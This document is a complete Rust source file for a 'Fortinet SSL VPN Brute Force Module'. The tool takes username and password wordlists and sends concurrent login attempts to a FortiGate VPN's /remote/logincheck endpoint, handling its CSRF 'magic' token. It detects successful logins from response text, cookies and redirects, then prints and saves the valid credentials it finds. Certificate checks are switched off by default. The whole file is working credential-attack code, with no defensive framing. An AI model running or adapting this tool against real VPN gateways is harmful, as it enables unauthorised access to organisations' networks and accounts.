use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use reqwest::{ClientBuilder, redirect::Policy};
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Path, PathBuf},
    sync::Arc,
    sync::atomic::{AtomicBool, AtomicU64, Ordering},
    time::Instant,
};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
use anyhow::Context;
use tokio::{
    sync::{Mutex, Semaphore},
    time::{sleep, Duration, timeout},
};
use regex::Regex;

const PROGRESS_INTERVAL_SECS: u64 = 2;

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();

        println!("{}", "=== Statistics ===".bold());
        println!("  Total attempts:    {}", total);
        println!("  Successful:        {}", success.to_string().green().bold());
        println!("  Failed:            {}", failed);
        println!("  Errors:            {}", errors.to_string().red());
        println!("  Elapsed time:      {:.2}s", elapsed);
        if elapsed > 0.0 {
            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
        }
    }
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Fortinet SSL VPN Brute Force Module                     ║".cyan());
    println!("{}", "║   FortiGate Web Login Credential Testing                  ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    let port: u16 = loop {
        let input = prompt_default("Fortinet VPN Port", "443").await?;
        match input.trim().parse::<u16>() {
            Ok(p) if p > 0 => break p,
            Ok(_) => println!("{}", "Port must be between 1 and 65535.".yellow()),
            Err(_) => println!("{}", "Invalid port number. Please enter a number between 1 and 65535.".yellow()),
        }
    };

    let usernames_file_path = loop {
        let input = prompt_required("Username wordlist path").await?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    let passwords_file_path = loop {
        let input = prompt_required("Password wordlist path").await?;
        let path = Path::new(&input);
        if !path.exists() {
            println!("{}", format!("File '{}' does not exist.", input).yellow());
            continue;
        }
        if !path.is_file() {
            println!("{}", format!("'{}' is not a regular file.", input).yellow());
            continue;
        }
        match File::open(path) {
            Ok(_) => break input,
            Err(e) => {
                println!("{}", format!("Cannot read file '{}': {}", input, e).yellow());
                continue;
            }
        }
    };

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10").await?;
        match input.trim().parse::<usize>() {
            Ok(n) if n > 0 && n <= 10000 => break n,
            Ok(n) if n == 0 => println!("{}", "Concurrency must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Concurrency must be between 1 and 10000.".yellow()),
            Err(_) => println!("{}", "Invalid number. Please enter a positive integer.".yellow()),
        }
    };

    let timeout_secs: u64 = loop {
        let input = prompt_default("Connection timeout (seconds)", "10").await?;
        match input.trim().parse::<u64>() {
            Ok(n) if n > 0 && n <= 300 => break n,
            Ok(n) if n == 0 => println!("{}", "Timeout must be greater than 0.".yellow()),
            Ok(_) => println!("{}", "Timeout must be between 1 and 300 seconds.".yellow()),
            Err(_) => println!("{}", "Invalid timeout. Please enter a number between 1 and 300.".yellow()),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
    let save_results = prompt_yes_no("Save results to file?", true).await?;
    let save_path = if save_results {
        Some(prompt_default("Output file name", "fortinet_results.txt").await?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false).await?;
    
    let trusted_cert = prompt_optional("Trusted certificate SHA256 (optional, for certificate pinning)").await?;
    let realm = prompt_optional("Authentication realm (optional)").await?;

    let base_url = build_fortinet_url(target, port)?;
    
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    println!("\n[*] Starting brute-force on {}", base_url);
    println!("[*] Timeout: {} seconds", timeout_secs);

    let users = load_lines(&usernames_file_path)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} usernames", users.len());

    let passwords = load_lines(&passwords_file_path)?;
    if passwords.is_empty() {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} passwords", passwords.len());

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let timeout_duration = Duration::from_secs(timeout_secs);

    // Generate all credential pairs based on mode
    let credential_pairs = if combo_mode {
        let mut pairs = Vec::new();
        for user in &users {
            for pass in &passwords {
                pairs.push((user.clone(), pass.clone()));
            }
        }
        pairs
    } else {
        // Cycle through users for each password
        passwords.iter().enumerate()
            .map(|(i, pass)| {
                let user = users[i % users.len()].clone();
                (user, pass.clone())
            })
            .collect()
    };

    println!("[*] Testing {} credential combinations", credential_pairs.len());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();

    for (user, pass) in credential_pairs {
        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
            break;
        }

        let base_url_clone = base_url.clone();
        let realm_clone = realm.clone();
        let trusted_cert_clone = trusted_cert.clone();
        let found_credentials_clone = Arc::clone(&found_credentials);
        let stop_signal_clone = Arc::clone(&stop_signal);
        let semaphore_clone = Arc::clone(&semaphore);
        let stats_clone = Arc::clone(&stats);
        let verbose_flag = verbose;
        let stop_on_success_flag = stop_on_success;

        tasks.push(tokio::spawn(async move {
            if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                return;
            }
            
            let _permit = match semaphore_clone.acquire_owned().await {
                Ok(permit) => permit,
                Err(_) => return,
            };
            
            if stop_on_success_flag && stop_signal_clone.load(Ordering::Relaxed) {
                return;
            }

            match try_fortinet_login(
                &base_url_clone, 
                &user, 
                &pass, 
                &realm_clone, 
                &trusted_cert_clone, 
                timeout_duration
            ).await {
                Ok(true) => {
                    println!("\r{}", format!("[+] {} -> {}:{}", base_url_clone, user, pass).green().bold());
                    let mut found = found_credentials_clone.lock().await;
                    found.push((base_url_clone.clone(), user.clone(), pass.clone()));
                    stats_clone.record_attempt(true, false);
                    if stop_on_success_flag {
                        stop_signal_clone.store(true, Ordering::Relaxed);
                    }
                }
                Ok(false) => {
                    stats_clone.record_attempt(false, false);
                    if verbose_flag {
                        println!("\r{}", format!("[-] {} -> {}:{}", base_url_clone, user, pass).dimmed());
                    }
                }
                Err(e) => {
                    stats_clone.record_attempt(false, true);
                    if verbose_flag {
                        println!("\r{}", format!("[!] {}: error: {}", base_url_clone, e).red());
                    }
                }
            }
            
            sleep(Duration::from_millis(100)).await;
        }));
    }

    // Wait for all tasks to complete
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task join error: {}", e).red());
            }
        }
    }

    // Stop progress reporter
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final();

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (url, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", url, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            match File::create(&filename) {
                Ok(mut file) => {
                    for (url, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", url, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file: {}", filename.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", filename.display());
                }
                Err(e) => {
                    eprintln!("[!] Could not create output file '{}': {}", filename.display(), e);
                }
            }
        }
    }

    Ok(())
}

async fn try_fortinet_login(
    base_url: &str, 
    username: &str, 
    password: &str, 
    realm: &Option<String>,
    trusted_cert: &Option<String>,
    timeout_duration: Duration
) -> Result<bool> {
    let mut client_builder = ClientBuilder::new()
        .cookie_store(true)
        .redirect(Policy::none())
        .timeout(timeout_duration);
    
    if trusted_cert.is_some() {
        client_builder = client_builder
            .danger_accept_invalid_certs(false)
            .danger_accept_invalid_hostnames(false);
    } else {
        client_builder = client_builder
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true);
    }
    
    let client = client_builder
        .build()
        .map_err(|e| anyhow!("Failed to create HTTP client: {}", e))?;

    // Get login page
    let login_page_url = format!("{}/remote/login", base_url);
    
    let login_page_response = match timeout(timeout_duration, client.get(&login_page_url).send()).await {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => return Err(anyhow!("Failed to get login page: {}", e)),
        Err(_) => return Err(anyhow!("Timeout getting login page")),
    };

    let login_page_body = match timeout(timeout_duration, login_page_response.text()).await {
        Ok(Ok(body)) => body,
        Ok(Err(e)) => return Err(anyhow!("Failed to read login page: {}", e)),
        Err(_) => return Err(anyhow!("Timeout reading login page")),
    };

    let csrf_token = extract_csrf_token(&login_page_body);

    // Prepare login form data
    let mut form_data = std::collections::HashMap::new();
    form_data.insert("username", username.to_string());
    form_data.insert("password", password.to_string());
    form_data.insert("ajax", "1".to_string());
    
    if let Some(r) = realm {
        if !r.is_empty() {
            form_data.insert("realm", r.clone());
        }
    }
    
    if let Some(token) = csrf_token {
        form_data.insert("magic", token.clone());
    }

    // Send login request
    let login_url = format!("{}/remote/logincheck", base_url);
    
    let login_response = match timeout(
        timeout_duration,
        client
            .post(&login_url)
            .form(&form_data)
            .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
            .header("Referer", &login_page_url)
            .send()
    ).await {
        Ok(Ok(resp)) => resp,
        Ok(Err(e)) => return Err(anyhow!("Login request failed: {}", e)),
        Err(_) => return Err(anyhow!("Timeout during login request")),
    };

    let status = login_response.status();
    
    let location_header = login_response.headers().get("Location")
        .and_then(|h| h.to_str().ok())
        .map(|s| s.to_string());
    
    let cookies: Vec<String> = login_response.cookies()
        .map(|c| c.name().to_string())
        .collect();
    
    let has_auth_cookie = cookies.iter().any(|name| {
        let lower = name.to_lowercase();
        lower.contains("session") || lower.contains("svpn") || lower.contains("fortinet")
    });
    
    let response_body = match timeout(timeout_duration, login_response.text()).await {
        Ok(Ok(body)) => body,
        Ok(Err(e)) => return Err(anyhow!("Failed to read login response: {}", e)),
        Err(_) => return Err(anyhow!("Timeout reading login response")),
    };

    // Check for success indicators
    if response_body.contains("redir") 
        || response_body.contains("\"1\"") 
        || response_body.contains("success")
        || response_body.contains("/remote/index")
        || response_body.contains("portal")
    {
        return Ok(true);
    }

    // Check for failure indicators
    if response_body.contains("error") 
        || response_body.contains("invalid") 
        || response_body.contains("failed")
        || response_body.contains("incorrect")
        || response_body.contains("\"0\"")
    {
        return Ok(false);
    }

    // Check status and cookies
    if status.is_success() && has_auth_cookie {
        return Ok(true);
    }

    // Check redirect location
    if status.as_u16() == 302 {
        if let Some(loc_str) = location_header {
            if loc_str.contains("/remote/index") 
                || loc_str.contains("portal")
                || loc_str.contains("index")
            {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

/// Extracts CSRF token from HTML response
fn extract_csrf_token(html: &str) -> Option<String> {
    let patterns = vec![
        r#"name="magic"\s+value="([^"]+)""#,
        r#"name="csrf_token"\s+value="([^"]+)""#,
        r#""magic"\s*:\s*"([^"]+)""#,
        r#"magic=([^&\s"]+)"#,
    ];

    for pattern in patterns {
        if let Ok(re) = Regex::new(pattern) {
            if let Some(captures) = re.captures(html) {
                if let Some(token) = captures.get(1) {
                    return Some(token.as_str().to_string());
                }
            }
        }
    }

    None
}

async fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;
        let mut s = String::new();
        tokio::io::BufReader::new(tokio::io::stdin())
            .read_line(&mut s)
            .await
            .context("Failed to read input")?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required. Please provide a value.".yellow());
        }
    }
}

async fn prompt_default(msg: &str, default_val: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default_val).cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut s = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut s)
        .await
        .context("Failed to read input")?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default_val.to_string()
    } else {
        trimmed.to_string()
    })
}

async fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        tokio::io::stdout()
            .flush()
            .await
            .context("Failed to flush stdout")?;
        let mut s = String::new();
        tokio::io::BufReader::new(tokio::io::stdin())
            .read_line(&mut s)
            .await
            .context("Failed to read input")?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

async fn prompt_optional(msg: &str) -> Result<Option<String>> {
    print!("{}", format!("{} (optional, press Enter to skip): ", msg).cyan().bold());
    tokio::io::stdout()
        .flush()
        .await
        .context("Failed to flush stdout")?;
    let mut s = String::new();
    tokio::io::BufReader::new(tokio::io::stdin())
        .read_line(&mut s)
        .await
        .context("Failed to read input")?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        None
    } else {
        Some(trimmed.to_string())
    })
}

/// Builds Fortinet VPN URL with proper IPv6 handling
fn build_fortinet_url(target: &str, port: u16) -> Result<String> {
    let clean_target = target.trim_matches(|c| c == '[' || c == ']');
    let is_ipv6 = clean_target.contains(':') && !clean_target.contains('.');
    
    let url = if is_ipv6 {
        format!("https://[{}]:{}", clean_target, port)
    } else {
        format!("https://{}:{}", clean_target, port)
    };
    
    Ok(url)
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
        .collect())
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path = Path::new(input_path_str);
    let filename_component = path
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .unwrap_or_else(|| std::borrow::Cow::Borrowed(input_path_str));

    let final_name = if filename_component.is_empty()
        || filename_component == "."
        || filename_component == ".."
        || filename_component.contains('/')
        || filename_component.contains('\\')
    {
        "fortinet_results.txt"
    } else {
        filename_component.as_ref()
    };

    PathBuf::from(format!("./{}", final_name))
}